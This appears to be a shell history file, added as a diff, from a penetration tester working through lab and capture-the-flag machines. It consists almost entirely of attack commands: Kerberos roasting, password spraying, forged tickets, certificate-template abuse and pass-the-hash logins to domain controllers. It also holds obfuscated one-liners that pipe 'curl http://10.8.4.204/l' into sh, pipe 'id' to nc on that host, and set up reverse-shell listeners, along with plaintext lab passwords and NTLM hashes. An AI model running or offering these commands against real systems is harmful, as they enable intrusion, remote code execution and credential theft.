@@ -1,0 +1,956 @@
+nxc smb scrm.local -u ksimpson -p ksimpson -k --shares
+nxc smb dc1.scrm.local -u ksimpson -p ksimpson -k --shares
+impacket-getTGT 
+impacket-getTGT scrm/ksimpson:ksimpson -dc-ip scrm.local
+export KRB5CCNAME=/home/kali/ksimpson.ccache
+ls /home/kali/ksimpson.ccache
+impacket-smbclient //dc1.scrm.local -k -no-pass
+impacket-smbclient //dc1.scrm.local -k -no-pass -Share Public
+impacket-smbclient dc1.scrm.local -k -no-pass 
+impacket-getTGT scrm.local/ksimpson:ksimpson -dc-ip scrm.local
+impacket-smbclient dc1.scrm.local -k -no-pass 
+ls
+open Network\ Security\ Changes.pdf
+impacket-mssqlclient scrm/ksimpson@dc1.scrm.local -windows-auth -dc-ip 10.10.11.168
+impacket-mssqlclient scrm/ksimpson@dc1.scrm.local -k -no-pass -windows-auth -dc-ip 10.10.11.168 
+impacket-mssqlclient scrm/ksimpson@dc1.scrm.local -k -no-pass -dc-ip 10.10.11.168 
+impacket-mssqlclient scrm.local/ksimpson@dc1.scrm.local -k -no-pass -dc-ip 10.10.11.168 
+file Network\ Security\ Changes.pdf
+exiftool Network\ Security\ Changes.pdf
+impacket-GetNPUsers -dc-ip 10.10.11.168  -request -outputfile hashes.asreproast scrm.local/ksimpson -k -no-pass
+impacket-GetNPUsers -dc-ip 10.10.11.168  -request -outputfile hashes.asreproast scrm.local/ksimpson -k -no-pass -dc-host scrm.local
+impacket-GetNPUsers -dc-ip 10.10.11.168  -request -outputfile hashes.asreproast scrm.local/ksimpson -k -no-pass -dc-host dc1.scrm.local
+impacket-GetUserSPNs -dc-ip 10.10.11.168  -request -outputfile hashes.asreproast scrm.local/ksimpson -k -no-pass -dc-host dc1.scrm.local
+hashcat -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt
+impacket-getTGT scrm.local/sqlsvc:Pegasus60 -dc-ip scrm.local
+export KRB5CCNAME=/home/kali/sqlsvc.ccache
+impacket-mssqlclient scrm.local/sqlsvc@dc1.scrm.local -k -no-pass -dc-ip 10.10.11.168 
+nxc mssql dc1.scrm.local -u sqlsvc -p Pegasus60
+nxc mssql dc1.scrm.local -u sqlsvc -p Pegasus60 -k -no-pass
+nxc mssql dc1.scrm.local -u sqlsvc -p Pegasus60 -k 
+nxc mssql dc1.scrm.local -u sqlsvc -p Pegasus60 -k --local-auth
+nxc mssql 10.10.11.168 -u sqlsvc -p Pegasus60 -k
+nxc mssql 10.10.11.168 -u sqlsvc -p Pegasus60 -k -d scrm
+nxc mssql 10.10.11.168 -u sqlsvc -p Pegasus60 -ntlm -d scrm
+nxc mssql 10.10.11.168 -u sqlsvc -p Pegasus60 
+nxc mssql dc1.scrm.local -u sqlsvc -p Pegasus60
+impacket-lookupsid sqlsvc@10.10.11.168
+impacket-lookupsid sqlsvc@10.10.11.168 -k -no-pass
+export KRB5CCNAME=/home/kali/sqlsvc.ccache
+impacket-lookupsid sqlsvc@10.10.11.168 -k -no-pass
+impacket-lookupsid sqlsvc@dc1.scrm.local -k -no-pass
+impacket-ticketer -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn sqlsvc Administartor
+impacket-ticketer -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn MSSQLSvc/dc1.scrm.local  Administartor
+export KRB5CCNAME=/home/kali/Administartor.ccache
+impacket-mssqlclient scrm.local/sqlsvc@dc1.scrm.local -k -no-pass -dc-ip 10.10.11.168 
+impacket-mssqlclient dc1.scrm.local -k
+enum4linux -a 10.10.10.248
+enum4linux -u guest -p '' -a 10.10.10.248
+nmap -T5 -sVC -Pn -p- 10.10.10.248 -oN nmapAll
+subl passwords.txt
+smbclient -L 10.10.10.248
+gobuster vhost -u http://intelligence.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50 --append-domain
+ldapsearch -x -H ldap://10.10.10.248 -D '' -w '' -b "DC=intelligence,DC=htb" 
+gobuster dir -u http://intelligence.htb -k -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html
+exiftool 2020-12-15-upload.pdf
+wget http://intelligence.htb/documents/2020-12-15-upload.pdf
+wget http://intelligence.htb/documents/2020-01-01-upload.pdf
+rm 2020-12-15-upload.pdf.1
+exiftool *.pdf | grep -i creator
+exiftool *.pdf | grep -i creator > usernames.txt
+subl usernames.txt
+nxc smb dc.intelligence.htb -u usernames.txt -p usernames.txt
+nxc ldap dc.intelligence.htb -u usernames.txt -p usernames.txt
+../../tools/kerbrute -h
+../../tools/kerbrute bruteuser
+../../tools/kerbrute bruteuser /usr/share/wordlists/rockyou.txt William.Lee --dc 10.10.10.248 -d intelligence.htb
+../../tools/kerbrute bruteuser /usr/share/wordlists/rockyou.txt William.Lee --dc 10.10.10.248 -d intelligence.htb -t 50
+../../tools/kerbrute bruteuser /usr/share/wordlists/rockyou.txt Jose.Williams --dc 10.10.10.248 -d intelligence.htb -t 50
+mkdir blood
+cd blood
+bloodhound-python -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c all --dns-tcp
+sudo neo4j start
+bloodhound
+feroxbuster -u http://intelligence.htb
+cat /usr/share/wordlists/rockyou.txt -n 5
+cat /usr/share/wordlists/rockyou.txt 
+head /usr/share/wordlists/rockyou.txt -n 5
+head /usr/share/wordlists/rockyou.txt -n 5000 > ../../rockYouTop5k.txt
+nxc smb dc.intelligence.htb -u usernames.txt -p ../../rockYouTop5k.txt
+subl path.py
+python3 path.py
+subl paths.txt
+python3 path.py
+subl paths.txt
+gobuster dir -u http://intelligence.htb/documents/ -k -w paths.txt -t 50
+python3 path.py
+cd downloads
+exiftool * | grep -i creat
+exiftool * | grep -i creat | sort -u > users.txt
+subl users.txt
+cd ..
+subl users.txt
+subl usernames.txt
+../../tools/kerbrute  passwordspray -d cicada.htb usernames.txt 'NewIntelligenceCorpUser9876' --dc 10.10.10.248 -t 50
+../../tools/kerbrute  passwordspray -d intelligence.htb usernames.txt 'NewIntelligenceCorpUser9876' --dc 10.10.10.248 -t 50
+../../tools/kerbrute  passwordspray -d intelligence.htb usernames.txt NewIntelligenceCorpUser9876 --dc 10.10.10.248 -t 50
+cat usernames.txt
+ls
+../../tools/kerbrute  passwordspray -d intelligence.htb usernames.txt NewIntelligenceCorpUser9876 --dc 10.10.10.248 
+../../tools/kerbrute  passwordspray usernames.txt NewIntelligenceCorpUser9876 --dc 10.10.10.248 -d intelligence.htb
+cd downloads
+exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist\
+
+cat userlist
+cp userlist ../usernames.txt
+cd ..
+../../tools/kerbrute  passwordspray usernames.txt NewIntelligenceCorpUser9876 --dc 10.10.10.248 -d intelligence.htb
+cat usernames.txt
+nxc smb dc.intelligence.htb -u usernames.txt -p NewIntelligenceCorpUser9876
+smbclient -L \\10.10.10.248 -U Tiffany.Molina
+smbclient  \\\\10.10.10.248\\IT -U Tiffany.Molina
+cat downdetector.ps1
+exiftool downdetector.ps1
+cd
+cd tools
+git clone https://github.com/dirkjanm/krbrelayx.git
+cd krbrelayx
+ls
+dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.16.7 -t A
+python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.16.7 -t A
+python3 dnstool.py -h
+cd ..
+git clone https://github.com/micahvandeusen/gMSADumper.git
+cd gMSADumper
+python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'
+impacket-getST spn 'HTTP/dc.intelligence.htb' -impersonate 'admin' -altservice 'cifs' -hashes :8ee3b94d589dba78682293e1281bd394 'intelligence/svc_int'
+impacket-getST spn 'HTTP/dc.intelligence.htb' -impersonate 'admin' -altservice 'cifs' -hashes :8ee3b94d589dba78682293e1281bd394 'intelligence.htb/svc_int'
+sudo ntpdate -s 10.10.10.248\
+
+impacket-getST spn 'HTTP/dc.intelligence.htb' -impersonate 'admin' -altservice 'cifs' -hashes :8ee3b94d589dba78682293e1281bd394
+impacket-getST spn 'WWW/dc.intelligence.htb' -impersonate 'admin' -altservice 'cifs' -hashes :8ee3b94d589dba78682293e1281bd394
+impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'admin' -altservice 'cifs' -hashes :8ee3b94d589dba78682293e1281bd394
+impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'admin' -altservice 'cifs' -hashes :8ee3b94d589dba78682293e1281bd394 intelligence.htb/svc_int
+impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator' -altservice 'cifs' -hashes :8ee3b94d589dba78682293e1281bd394 intelligence.htb/svc_int
+ls
+export KRB5CCNAME=/home/kali/tools/gMSADumper/administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+impacket-psexec Administrator@10.10.10.248 -k -no-pass
+impacket-psexec Administrator@dc.intelligence.htb -k -no-pass
+sudo responder -I tun0
+subl hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+evil-winrm -i 10.10.10.248 -u Ted.Graves -p Mr.Teddy
+impacket-psexec Ted.Graves@10.10.10.248 
+enum4linux -a 10.10.11.174
+mkdir blood; cd blood
+bloodhound-python -d support.htb -u support -p 'Ironside47pleasure40Watchful' -ns 10.10.11.174 -c all --dns-tcp
+l
+sudo neo4j start
+bloodhound
+smbclient -L 10.10.11.174
+smbclient \\\\10.10.11.174\\support-tools
+unzip UserInfo.exe.zip
+ls
+strings * | grep pass
+strings * | grep -i pass
+strings * | grep pass
+strings * -n 8
+subl passwords.txt
+sudo subl /etc/hosts
+ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
+ldapdomaindump 'ldap://support.htb' -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'\
+
+open domain_users.html
+cat domain_users.json | jq '.[] | select(.attributes.description != null and .attributes.description[0] != null) | {sAMAccountName: .attributes.sAMAccountName[0], description: .attributes.description[0]}'\
+
+cat domain_users.json | jq
+cat domain_users.json | jq | grep description -A 2
+cat domain_users.json | jq | grep -i info -A 2 -B 2
+evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb\
+
+cd 
+cd tools
+evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
+impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'support.htb/support:Ironside47pleasure40Watchful'
+impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 10.10.11.174 -domain-netbios support.htb 'support.htb/support:Ironside47pleasure40Watchful'
+cd
+cd tools
+wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1
+ls
+impacket-getST support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
+sudo subl /etc/hosts
+impacket-getST support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
+export KRB5CCNAME=/home/kali/tools/administrator@http_dc.support.htb@SUPPORT.HTB.ccache
+impacket-psexec administrator@dc.support.htb -k -no-pass
+cd blood
+cp ../../../tools/winpeas.exe .
+impacket-smbserver share . -smb2support
+ls
+impacket-smbserver share . -smb2support
+nmap -T5 -sVC -Pn -p- 10.10.10.182 -oN nmapAll
+evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2\
+
+evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd
+evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles
+enum4linux -a 10.10.10.182
+ldapsearch -x -H ldap://10.10.10.182 -D '' -w '' -b "DC=CASCADE,DC=local" 
+ldapsearch -x -H ldap://10.10.10.182 -D '' -w '' -b "DC=CASCADE,DC=local" | grep -i pass
+ldapsearch -x -H ldap://10.10.10.182 -D '' -w '' -b "DC=CASCADE,DC=local" | grep -i pwd
+nxc smb CASCADE.LOCAL -u r.thompson -p rY4n5eva
+nxc smb CASCADE.LOCAL -u r.thompson -p rY4n5eva --shares
+smbclient \\\\10.10.10.182\\Data -u r.thompson
+smbclient \\\\10.10.10.182\\Data -U r.thompson
+;s
+ls
+ls Contractors
+subl IT
+subl php.php
+php php.php
+git clone https://github.com/jason-klein/php-vnc-password.git
+cd php-vnc-password
+ls
+composer insta;;
+composer install
+./vendor/phpunit/phpunit/phpunit tests/\
+
+ls
+cd tests
+ls
+php vncPasswordTest.php
+cd ..
+php php.php
+cd php-vnc-password
+;s
+ls
+composer install
+composer update
+sudo composer update 
+composer update --ignore-platform-req=ext-dom
+cd ..
+evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
+nxc smb CASCADE.LOCAL -u s.smith -p sT333ve2 --shares
+smbclient \\\\10.10.10.182\\Audit -U s.smith
+smbclient \\\\10.10.10.182\\Audit$ -U s.smith
+sqlitebrowser Audit.db
+smbclient -L 10.10.10.182
+subl usernames.txt
+evil-winrm -i CASCADE.LOCAL -u r.thompson -p rY4n5eva
+cp /usr/share/webshells/php/php-reverse-shell.php .
+subl php-reverse-shell.php
+nc -lnvp 1234
+stty raw -echo ; fg
+ssh user@10.10.81.195
+nmap -T5 10.10.81.195 -vv
+nmap -T5 -Pn 10.10.81.195 -vv
+ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@10.10.81.195
+cd HTB/
+mkdir Cascade
+cd Cascade
+subl progress
+nmap -T4 -sVC -Pn 10.10.10.182
+subl progress
+sudo subl /etc/hosts
+mkdir ldap
+cd ldap
+ldapdomaindump 'ldap://CASCADE.htb' -u 'CASCADE.htb\' -p ''\
+
+ls
+ping CASCADE.htb
+ldapdomaindump 'ldap://CASCADE.local' -u 'CASCADE.local\' -p ''\
+
+ls
+ldapdomaindump 'ldap://CASCADE.local' -u '' -p ''
+impacket-GetNPUsers CASCADE.LOCAL/ -dc-ip 10.10.10.182 -request
+impacket-GetNPUsers CASCADE.LOCAL/ -dc-ip 10.10.10.182 -no-pass -usersfile ../usernames.txt
+clear
+cp '/var/run/vmblock-fuse/blockdir/zIxIVN/whoami03.ovpn' ../../..
+cd
+ftp anonymous@10.10.243.174
+cd tools
+ls
+python3 -m http.server 80
+cd
+mkdir THM
+cd THM
+xfreerdp /v:10.10.80.107 /u:kkidd /p:Pass123321@
+docker
+sudo apt install docker-io
+sudo apt update
+sudo apt install docker-io
+sudo apt install docker-cli -y
+sudo docker run --name vulnlab -d -p 1337:80 yavuzlar/vulnlab:latest\
+
+docker run --help
+cd VulnLab
+sudo docker build -t yavuzlar/vulnlab .\
+
+sudo systemctl status docker\
+
+sudo usermod -aG docker $USER\
+
+sudo apt-get install docker-buildx-plugin\
+
+sudo apt install docker.io\
+
+sudo apt remove docker-cli 
+sudo apt install docker.io -y
+sudo  docker run --name vulnlab -d -p 1337:80 yavuzlar/vulnlab:latest\
+
+exit
+curl http://192.168.1.82:9090/etc/passwd
+curl --path-as-is -s -o /dev/null http://192.168.1.82:9090/etc/passwd
+curl --path-as-is -s -o /dev/null http://192.168.1.82:9090/students/../../../../../etc/passwd
+curl http://192.168.1.82:9090/students/../../../../../etc/passwd
+ls
+grep -r aiohttp
+subl sqli/routes.py
+curl http://192.168.1.82:9090/static/../../../../../etc/passwd
+subl requirements.txt
+git clone https://github.com/z3rObyte/CVE-2024-23334-PoC.git
+cd CVE-2024-23334-PoC
+ls
+bash exploit.sh
+bash exploit.sh http://192.168.1.82:9090/
+bash exploit.sh -h
+python3 server.py
+sudo  docker run --name vulnlab -d -p 1337:80 yavuzlar/vulnlab:latest\
+
+docker stop vulnlab\
+
+sudo docker stop vulnlab\
+
+git clone https://github.com/vulnerable-apps/vulnerable-react-app.git\
+cd vulnerable-react-app\
+git submodule init\
+git submodule update --remote --merge
+docker-compose up -d\
+
+docker-compose
+sudo apt install docker-compose
+docker compose
+docker --help
+sudo pip3 install docker-compose\
+
+sudo pip3 install docker-compose --break-system-packages
+docker-compose
+sudo apt-get install docker-compose-plugin\
+
+ls
+docker compose up -d\
+
+docker compose
+sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose\
+
+sudo chmod +x /usr/local/bin/docker-compose\
+
+docker-compose up -d\
+
+sudo docker-compose up -d\
+
+cat docker-compose.yml
+ls
+cd reactvulna
+ks
+ls
+cd ..
+ip a
+cd ..
+git clone https://github.com/vulnerable-apps/dvpwa.git
+cd dvpwa
+ls
+subl docker-compose.yml
+sudo docker-compose up -d
+sudo docker-compose down
+sudo docker-compose up -d
+sudo docker-compose down
+sudo docker-compose up -d --build
+subl sqli/routes.py
+sudo docker-compose up -d --build
+cd ..
+bash exploit.sh http://localhost:8081
+bash exploit.sh http://localhost:8081/
+bash exploit.sh http://192.168.1.82:9090/
+subl exploit.sh
+bash exploit.sh 
+sudo apt update\
+sudo apt install vsftpd -y\
+
+sudo nano /etc/vsftpd.conf\
+
+sudo subl /etc/vsftpd.conf\
+
+mkdir /srv/ftp
+cd /srv/ftp
+ls
+echo "superadmin:superadmin" > .important.txt
+sudo echo "superadmin:superadmin" > .important.txt
+sudo su
+cd vulnerable-react-app
+ls
+sudo docker-compose up -d --build
+cat docker-compose.yml
+sudo docker-compose up -d
+cat docker-compose.yml
+sudo docker-compose up -d --build
+cd ../dvpwa
+sudo docker-compose up -d --build
+cat docker-compose.yml
+mkdir cptc
+cd cptc
+subl usernames.txt
+subl passwords.txt
+subl progress
+nxc smb 10.10.104.0/24 -u usernames.txt -p passwords.txt
+nxc smb 10.10.140.0/24 -u usernames.txt -p passwords.txt
+nxc smb 10.10.140.0/24 -u usernames.txt -p passwords.txt --shares
+nxc mssql 10.10.140.0/24 -u usernames.txt -p passwords.txt --shares
+nxc mssql 10.10.140.0/24 -u usernames.txt -p passwords.txt 
+nxc mssql 10.10.140.0/24 -u usernames.txt -p passwords.txt --local-auth
+impacket-mssqlclient web_staging@10.10.140.102 
+ls
+subl usernames.txt
+nxc smb 10.10.140.0/24 -u usernames.txt -p passwords.txt --continue-on-sucess
+nxc smb 10.10.140.0/24 -u usernames.txt -p passwords.txt --continue-on-success
+nxc smb 10.10.140.0/24 -u usernames.txt -p passwords.txt --continue-on-success --local-auth
+nxc ldap 10.10.140.0/24 -u usernames.txt -p passwords.txt --continue-on-success
+nxc ldap 10.10.140.0/24 -u usernames.txt -p passwords.txt --continue-on-succes
+nxc ldap 10.10.140.0/24 -u usernames.txt -p passwords.txt --continue-on-success
+nmap -T4 -sVC -Pn 10.10.224.86 -oN 10.10.224.86_nmap
+mysql -h 10.10.224.86 -u root -p
+cd ..
+git clone https://github.com/scnr/installer.git codename-scnr-installer\
+cd codename-scnr-installer\
+\
+docker compose up -d --build
+sudo docker-compose up -d --build
+docker exec -it codename-scnr-app-1 bash
+sudo docker exec -it codename-scnr-app-1 bash
+sudo docker-compose up 
+subl docker-compose.yml
+sudo docker-compose up 
+sudo docker-compose up -d
+sudo docker exec -it codename-scnr-app-1 bash
+cd
+subl commands.txt
+cd vulnlab
+ls
+cd chains
+mkdir puppet
+cd puppet
+subl AD_IPs.txt
+nmap -h
+nmap -iL AD_IPs.txt -T4 -sVC -oN nmap_all
+nmap -iL AD_IPs.txt -T4 -Pn -sVC -oN nmap_all
+smbclient -L 10.10.231.182
+ftp anonymous@10.10.231.183
+ls
+cat red_127.0.0.1.cfg
+rm sliver-client_linux
+ftp anonymous@10.10.231.183
+./sliver-client_linux -h
+chmod +x ./sliver-client_linux 
+./sliver-client_linux -h
+./sliver-client_linux import red_127.0.0.1.cfg
+./sliver-client_linux
+./sliver-client_linux import red_127.0.0.1.cfg
+./sliver-client_linux
+cp red_127.0.0.1.cfg red_10.10.231.183.cfg
+./sliver-client_linux
+./sliver-client_linux import red_10.10.231.183.cfg
+./sliver-client_linux
+rm /home/kali/.sliver-client/configs/red_127.0.0.1.cfg
+./sliver-client_linux import red_10.10.231.183.cfg
+./sliver-client_linux
+subl red_127.0.0.1.cfg
+./sliver-client_linux import red_127.0.0.1.cfg
+./sliver-client_linux
+cd
+cd tools
+ls
+cp winpeas.exe /home/kali/vulnlab/chains/puppet
+cd 
+cd vulnlab
+cd chains/puppet
+nano hash
+hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
+msfvenom -p windows/adduser USER=hacker PASS=Password@1 -f exe > puppet-update.exe
+sudo showmount -e 10.10.186.134
+sudo mount -tnfs 10.10.186.134:/opt/share /tst
+mkdir /tst
+sudo mkdir /tst
+sudo mount -tnfs 10.10.186.134:/opt/share /tst
+cd /tst
+ls
+ls -al
+cp backup.tar.gz /home/kali/vulnlab/chains/hybrid
+cd /home/kali/vulnlab/chains/hybrid
+sudo umount /tst
+sudo rm -rf /tst
+tar -xvf backup.tar.gz
+cat etc/passwd
+cat etc/passwd | grep home
+ls
+ls opt
+ls opt/certs
+ls opt/certs/hybrid.vl/
+cat etc/dovecot/dovecot-users 
+ssh peter.turner@mail01.hybrid.vl
+subl usernames.txt
+subl passwords.txt
+ls
+subl .
+sudo subl /etc/hosts
+telnet 10.10.186.133 110
+telnet 10.10.186.134 110
+mkdir blood; cd blood
+bloodhound-python -d hybrid.vl -u peter.turner -p 'PeterIstToll!' -ns 10.10.186.133 -c all --dns-tcp
+nxc smb 10.10.186.133 -u ../usernames.txt -p ../passwords.txt
+python3 -m http.server 80
+nc -lnvp 1234
+nc -lnvp 80
+python3 -m http.server 80
+subl l
+python3 -m http.server 80
+ls -al
+cd ..
+ls -al
+sudo mount -tnfs 10.10.186.134:/opt/share /tst
+mkdir /tst
+sudo subl /etc/logins.defs
+sudo subl /etc/login.defs
+sudo useradd uwm -u 902601108
+su uwm
+sudo passwd uwm
+su uwm
+sudo mount -tnfs 10.10.186.134:/opt/share /tst
+sudo mkdir /tst
+sudo mount -tnfs 10.10.186.134:/opt/share /tst
+su uwm
+echo 'curl http://10.8.4.204/l | sh' | base64
+nc -lnvp 1234
+nc -lnvp 443
+stty raw -echo ; fg
+bash -c 'curl${IFS}http://10.8.4.204/LOL'
+bash -c 'curl${IFS}//10.8.4.204/LOL'
+bash -c 'id${IFS}|${IFS}nc${IFS}10.8.4.204${IFS}1234'
+python3 -m http.server 80
+bash -c 'echo${IFS}Y3VybCBodHRwOi8vMTAuOC40LjIwNC9sIHwgc2gK${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh'
+bash -c 'echo${IFS}Y3VybCBodHRwOi8vMTAuOC40LjIwNC9sIHwgc2gK${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash'
+bash -c 'echo${IFS}Y3VybCBodHRwOi8vMTAuOC40LjIwNC9sIHwgc2gK${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}sh|${IFS}sh'
+cd
+cd tools
+ls
+python3 -m http.server 80
+nmap -T5 -sVC -Pn 10.10.231.181
+cp red_127.0.0.1.cfg lool
+subl lool
+cp /home/kali/tools/SharpHound.exe
+cp /home/kali/tools/SharpHound.exe .
+python3 -m http.server 80
+sudo neo4j start
+bloodhound
+cd ../
+mkdir hybrid
+cd hybrid
+subl IPs.txt
+nmap -iL IPs.txt -T4 -sVC -Pn -oN nmap_all
+sudo subl /etc/hosts
+sudo showmount -e 10.10.186.133
+nmap -iL IPs.txt -T4 -sVC -Pn -oN nmap_all
+file password
+file password.kdbx
+keepass2john password.kdbx > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+kpcli
+cd blood
+bloodhound-python -d 'hybrid.vl' -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -gc 'dc01.hybrid.vl' -ns 10.10.186.134
+cat ../nmap_all
+bloodhound-python -d 'hybrid.vl' -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -gc 'dc01.hybrid.vl' -ns 10.10.186.133
+bloodhound
+cd ..
+certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -vulnerable -stdout -dc-ip 10.10.228.165\
+
+certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -vulnerable -stdout -dc-ip 10.10.186.133
+impacket-addcomputer hybrid.vl/peter.turner:'b0cwR+G4Dzl_rw' -computer-name computer_name -computer-pass computer_password
+impacket-addcomputer HYBRID.VL/peter.turner:'b0cwR+G4Dzl_rw' -computer-name computer_name -computer-pass computer_password
+git clone https://github.com/sosdave/KeyTabExtract.git
+cd KeyTabExtract
+python3 keytabextract.py
+python3 keytabextract.py krb5.keytab
+impacket-addcomputer hybrid.vl/peter.turner:'b0cwR+G4Dzl_rw' -computer-name MAIL01 -hashes 0f916c5246fdbc7ba95dcef4126d57bd
+impacket-addcomputer hybrid.vl/peter.turner:'b0cwR+G4Dzl_rw' -computer-name MAIL01 -hashes :0f916c5246fdbc7ba95dcef4126d57bd
+impacket-addcomputer hybrid.vl/peter.turner:'b0cwR+G4Dzl_rw' -computer-name MAIL01$ -hashes :0f916c5246fdbc7ba95dcef4126d57bd
+certipy req -u 'MAIL01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd -ca hybrid-DC01-CA -template HybridComputers -upn administrator@HYBRID.VL  -dc-ip 10.10.186.133
+certipy req -u 'MAIL01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd -ca hybrid-DC01-CA -template HybridComputers -upn administrator@HYBRID.VL  -dc-ip 10.10.186.133 -debug
+certipy req -u 'MAIL01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd -ca hybrid-DC01-CA -template HybridComputers -upn administrator@HYBRID.VL  -dc-ip 10.10.186.133 -key-size 4096
+sudo subl /etc/hosts
+certipy req -u 'MAIL01$'@hybrid.vl -hashes :0f916c5246fdbc7ba95dcef4126d57bd -ca hybrid-DC01-CA -template HybridComputers -upn administrator@HYBRID.VL  -dc-ip 10.10.186.133 -key-size 4096
+certipy auth -pfx administrator.pfx -domain HYBRID.VL -username administrator -dc-ip 10.10.186.133\
+
+certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.186.133\
+
+certipy req -u 'MAIL01$' -hashes ":0f916c5246fdbc7ba95dcef4126d57bd" -dc-ip "10.10.228.165" -ca 'hybrid-DC01-CA' -template 'HYBRIDCOMPUTERS' -upn 'administrator' -target 'dc01.hybrid.vl' -key-size 4096\
+
+certipy req -u 'MAIL01$' -hashes ":0f916c5246fdbc7ba95dcef4126d57bd" -dc-ip "10.10.186.133" -ca 'hybrid-DC01-CA' -template 'HYBRIDCOMPUTERS' -upn 'administrator' -target 'dc01.hybrid.vl' -key-size 4096\
+
+certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.186.133
+impacket-psexec administrator@hybrid.vl -hashes aad3b435b51404eeaad3b435b51404ee:60701e8543c9f6db1a2af3217386d3dc
+impacket-smbexec administrator@hybrid.vl -hashes aad3b435b51404eeaad3b435b51404ee:60701e8543c9f6db1a2af3217386d3dc
+impacket-wmiexec administrator@hybrid.vl -hashes aad3b435b51404eeaad3b435b51404ee:60701e8543c9f6db1a2af3217386d3dc
+evil-winrm -u administrator -i hybrid.vl -hashes aad3b435b51404eeaad3b435b51404ee:60701e8543c9f6db1a2af3217386d3dc
+evil-winrm -u administrator -i hybrid.vl -H 60701e8543c9f6db1a2af3217386d3dc
+sudo openvpn aws.ovpn
+sudo openvpn lab_whoami03.ovpn
+enum4linux -a 10.10.111.58
+cd VulnLab
+ls
+cat run.sh
+cd ..
+rm -r VulnLab
+cd vuln
+cd vulnlab
+lc
+ls
+mkdir machines
+cd machines
+mkdir escape
+cd escape
+nmap -T4 -sVC -Pn 10.10.104.254
+nmap -T4 -sVC -Pn 10.10.104.254 -p- -vv
+cd ..
+mkdir lock
+cd lock
+nmap -T4 -sVC -Pn 10.10.111.58
+nc 10.10.111.58 5357
+nmap -T4 -sVC -Pn 10.10.111.58 -p- -vv
+nmap -T4 -sVC -Pn 10.10.111.58
+git clone http://10.10.111.58:3000/ellen.freeman/dev-scripts.git
+cd dev-scripts
+ls
+git logs
+git log
+git show 8b78e6c3024416bce55926faa3f65421a25d6370
+cd
+evil-winrm -i 10.10.11.158 -u Administrator -p '-6/8RYZp4hY6t)'
+ldapsearch -h streamio.htb -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+sudo subl /etc/hosts
+ldapsearch -h streamio.htb -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+nxc ldap streamio.htb -u JDgodd -w 'JDg0dd1s@d0p3cr3@t0r' -M laps
+nxc ldap streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -M laps
+nxc ldap streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
+nxc ldap 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
+ping 10.10.11.158
+ping google.com
+smbclient -L 10.10.111.58
